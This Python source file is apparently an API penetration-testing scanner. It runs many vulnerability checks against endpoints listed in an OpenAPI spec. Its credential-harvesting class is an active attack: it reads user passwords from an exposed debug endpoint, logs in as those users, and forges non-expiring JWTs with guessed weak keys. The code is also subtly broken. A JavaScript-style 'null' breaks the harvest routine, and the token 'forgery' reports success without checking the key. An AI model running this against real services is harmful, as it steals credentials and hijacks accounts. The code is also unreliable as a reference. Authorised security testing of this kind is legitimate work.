#!/usr/bin/env python3

import yaml
import asyncio
from typing import Dict, List, Any, Optional
import importlib
import inspect
from urllib.parse import urljoin
import requests
import logging
import json
import time
from datetime import datetime, timedelta
from datetime import datetime, UTC
import jwt

class CustomJSONEncoder(json.JSONEncoder):
    def default(self, obj):
        if isinstance(obj, bytes):
            return obj.decode('utf-8', errors='replace')
        return super().default(obj)

# Import security check modules
from RAGScripts.RAG_SQLi import SQLiScanner
from RAGScripts.RAG_unauthorized_password_change import UnauthorizedPasswordChangeScanner
from RAGScripts.RAG_BOLA import BOLAScanner
from RAGScripts.RAG_MassAssign import MassAssignmentScanner
from RAGScripts.RAG_Leak import DataExposureScanner
from RAGScripts.RAG_UserPass import UserPassEnumScanner
from RAGScripts.RAG_RegexDoS import RegexDOSScanner
from RAGScripts.RAG_Rate import RateLimitScanner
from RAGScripts.RAG_jwt_bypass import JWTBypassScanner
from RAGScripts.RAG_CORS import CORSScanner
from RAGScripts.RAG_SSRF import SSRFScanner
from RAGScripts.RAG_CMDi import CommandInjectionScanner
from RAGScripts.RAG_XSS import XSSScanner
from RAGScripts.RAG_HTTPMethod import HTTPMethodScanner
from RAGScripts.RAG_HostHeader import HostHeaderScanner
from RAGScripts.RAG_JWT import JWTScanner
from RAGScripts.RAG_OpenRedirect import OpenRedirectScanner
from RAGScripts.RAG_PathTraversal import PathTraversalScanner
from RAGScripts.RAG_UserEnum import UserEnumScanner
from RAGScripts.utils.auth_handler import AuthHandler

def setup_logging(verbosity: int = 1) -> logging.Logger:
    logger = logging.getLogger('api_security_scanner')
    
    if verbosity == 1:
        level = logging.INFO
    elif verbosity == 2:
        level = logging.DEBUG
    elif verbosity >= 3:
        level = logging.DEBUG
    else:
        level = logging.WARNING
    
    handler = logging.StreamHandler()
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    logger.setLevel(level)
    
    return logger

class CredentialHarvester:
    def __init__(self, base_url: str, logger: logging.Logger):
        self.base_url = base_url
        self.logger = logger
        self.credentials = []
        self.admin_token = None

    def harvest_credentials(self) -> List[Dict]:
        """Harvest credentials from debug endpoint"""
        try:
            response = requests.get(f"{self.base_url}/users/v1/_debug")
            if response.status_code == 200:
                users = response.json().get('users', [])
                self.credentials = users
                self.logger.info(f"Harvested {len(users)} user credentials")
                return {
                    "type": "CREDENTIAL_EXPOSURE",
                    "severity": "CRITICAL",
                    "endpoint": f"{self.base_url}/users/v1/_debug",
                    "parameter": null,
                    "attack_pattern": "Direct access to debug endpoint",
                    "detail": "Exposed credentials through debug endpoint",
                    "evidence": {
                        "code": "@app.route('/users/v1/_debug')\ndef debug_endpoint():\n    users = User.query.all()\n    return jsonify({'users': [u.to_dict() for u in users]})",
                        "payload": "GET /users/v1/_debug",
                        "response_sample": json.dumps({"users": [users[0] if users else {}]})[:200],
                        "url": f"{self.base_url}/users/v1/_debug",
                        "user_count": len(users),
                        "sample": users[0] if users else None
                    }
                }
        except Exception as e:
            self.logger.error(f"Error harvesting credentials: {str(e)}")
        return None

    def generate_admin_token(self) -> Optional[str]:
        """Generate admin token using harvested credentials"""
        if not self.credentials:
            return None

        # Try to find admin users first
        admin_users = [user for user in self.credentials if user.get('admin', False)]
        test_users = admin_users if admin_users else self.credentials

        for user in test_users:
            try:
                response = requests.post(
                    f"{self.base_url}/users/v1/login",
                    json={
                        "username": user['username'],
                        "password": user['password']
                    }
                )
                if response.status_code == 200:
                    token = response.json().get('auth_token')
                    if token:
                        # Create a new token with no expiration
                        try:
                            # Decode the original token to get the payload
                            decoded = jwt.decode(token, options={"verify_signature": False})
                            # Create new payload without exp claim
                            payload = {
                                "sub": decoded['sub'],
                                "iat": datetime.now(UTC)
                            }
                            # Try common weak keys
                            weak_keys = ['secret', 'key', 'private', 'password', '123456']
                            for key in weak_keys:
                                try:
                                    new_token = jwt.encode(payload, key, algorithm='HS256')
                                    self.admin_token = new_token
                                    self.logger.info(f"Generated admin token using key: {key}")
                                    return new_token
                                except:
                                    continue
                        except Exception as e:
                            self.logger.error(f"Error modifying token: {str(e)}")
            except Exception as e:
                self.logger.error(f"Error testing credentials: {str(e)}")
        return None

class APISecurityScanner:
    def __init__(self, spec_file: str, target_url: str, verbosity: int = 1, token: Optional[str] = None):
        self.spec_file = spec_file
        self.target_url = target_url
        self.logger = setup_logging(verbosity)
        self.spec = self._load_spec()
        self.discovery_cache = {}
        self.headers = {}
        self.time_module = time
        self.auth_handler = AuthHandler()
        
        # Initialize findings manager
        from RAGScripts.utils.findings_manager import FindingsManager
        self.findings_manager = FindingsManager(self.logger)
        
        # Extract security schemes and generate headers
        security_schemes = self.auth_handler.extract_security_schemes(self.spec)
        self.headers.update(self.auth_handler.generate_auth_headers(security_schemes, token))
        
        # Initialize credential harvester and try to get admin token first
        self.harvester = CredentialHarvester(target_url, self.logger)
        
        if not token:
            finding = self.harvester.harvest_credentials()
            if finding:
                finding_id = self.findings_manager.add_finding(finding)
                token = self.harvester.generate_admin_token()
                if token:
                    self.logger.info("Successfully generated admin token")
                    # Store the token and update headers
                    self.findings_manager.add_token('admin', token, {'source': 'harvester'})
                    self.headers.update(self.auth_handler.generate_auth_headers(security_schemes, token))
                else:
                    self.logger.warning("Failed to generate admin token")
        
        # Initialize security checks after token is set
        self.security_checks = [
            SQLiScanner,
            UnauthorizedPasswordChangeScanner,
            BOLAScanner,
            MassAssignmentScanner,
            DataExposureScanner,
            UserPassEnumScanner,
            RegexDOSScanner,
            RateLimitScanner,
            JWTBypassScanner,
            CORSScanner,
            SSRFScanner,
            CommandInjectionScanner,
            XSSScanner,
            HTTPMethodScanner,
            HostHeaderScanner,
            JWTScanner,
            OpenRedirectScanner,
            PathTraversalScanner,
            UserEnumScanner
        ]
        self.logger.info(f"Loaded {len(self.security_checks)} security scanners")

    def scan_endpoint(self, path: str, methods: Dict[str, Any]) -> List[Dict]:
        findings = []
        # Initialize finding formatter if not already done
        from RAGScripts.utils.finding_formatter import FindingFormatter
        formatter = FindingFormatter()
        try:
            endpoint_url = urljoin(self.target_url, path)

            for method, details in methods.items():
                self.logger.info(f"Scanning endpoint: {method} {endpoint_url}")
                
                # Get endpoint-specific security requirements
                endpoint_security = self.auth_handler.get_endpoint_security(self.spec, path, method)
                
                try:
                    response = requests.request(method, endpoint_url, headers=self.headers)
                    
                    for scanner_class in self.security_checks:
                        try:
                            scanner = scanner_class()
                            if hasattr(scanner, 'time'):
                                scanner.time = self.time_module
                            
                            self.logger.debug(f"Running {scanner_class.__name__} on {method} {endpoint_url}")
                            
                            # Get context for this scanner
                            scanner_context = self.findings_manager.get_context(scanner_class.__name__)
                            
                            # Pass headers, tokens, and context to scanner
                            check_findings = scanner.scan(
                                endpoint_url,
                                method,
                                path,
                                response,
                                headers=self.headers,
                                tokens=self.findings_manager.get_tokens(),
                                context=scanner_context
                            )
                            
                            if check_findings:
                                for finding in check_findings:
                                    # Format finding to match enhanced format
                                    formatted_finding = formatter.format_finding(finding, self.target_url, path)
                                    
                                    # Add finding with dependencies
                                    finding_id = self.findings_manager.add_finding(
                                        formatted_finding,
                                        dependencies=finding.get('dependencies', [])
                                    )
                                    findings.append(formatted_finding)
                                self.logger.info(f"{scanner_class.__name__} found {len(check_findings)} issues")
                                
                        except Exception as e:
                            self.logger.error(f"Error in {scanner_class.__name__}: {str(e)}")
                            continue
                            
                except requests.RequestException as e:
                    self.logger.error(f"Error accessing {endpoint_url}: {str(e)}")
                    continue

            return findings
        except Exception as e:
            self.logger.error(f"Critical error scanning {path}: {str(e)}")
            return findings

    def run(self) -> List[Dict]:
        """Execute the API security scan and return findings"""
        try:
            self.logger.info("Starting API security scan...")
            
            # Execute the main API scan
            scan_findings = self.scan_api()
            
            # Get all findings with dependencies
            findings = self.findings_manager.get_findings(with_dependencies=True)
            
            self.logger.info(f"Scan complete. Found {len(findings)} potential security issues")
            return findings
            
        except Exception as e:
            self.logger.error(f"Critical error during scan: {str(e)}")
            return self.findings_manager.get_findings()  # Return any findings collected before the error

    def scan_api(self) -> List[Dict]:
        all_findings = []
        paths = self.spec.get('paths', {})

        for path, methods in paths.items():
            try:
                findings = self.scan_endpoint(path, methods)
                all_findings.extend(findings)
            except Exception as e:
                self.logger.error(f"Error scanning path {path}: {str(e)}")
                continue

        return all_findings
        
    def _load_spec(self):
        """Load and parse OpenAPI specification file"""
        try:
            with open(self.spec_file, 'r') as f:
                return yaml.safe_load(f)
        except FileNotFoundError:
            self.logger.error(f"Specification file not found: {self.spec_file}")
            raise
        except yaml.YAMLError as e:
            self.logger.error(f"Error parsing specification file: {str(e)}")
            raise
        except Exception as e:
            self.logger.error(f"Unexpected error loading specification: {str(e)}")
            raise

def main():
    import argparse
    parser = argparse.ArgumentParser(description='API Security Scanner')
    parser.add_argument('spec_file', help='Path to OpenAPI specification file')
    parser.add_argument('target_url', help='Target API base URL')
    parser.add_argument('-v', '--verbosity', type=int, default=1, help='Verbosity level (1-3)')
    parser.add_argument('--token', help='Bearer token for authenticated requests')
    parser.add_argument('-o', '--output', help='Output file for findings')
    
    args = parser.parse_args()
    
    scanner = APISecurityScanner(
        spec_file=args.spec_file,
        target_url=args.target_url,
        verbosity=args.verbosity,
        token=args.token
    )
    
    findings = scanner.run()
    
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(findings, f, indent=2, cls=CustomJSONEncoder)
    else:
        print(json.dumps(findings, indent=2, cls=CustomJSONEncoder))

if __name__ == '__main__':
    main()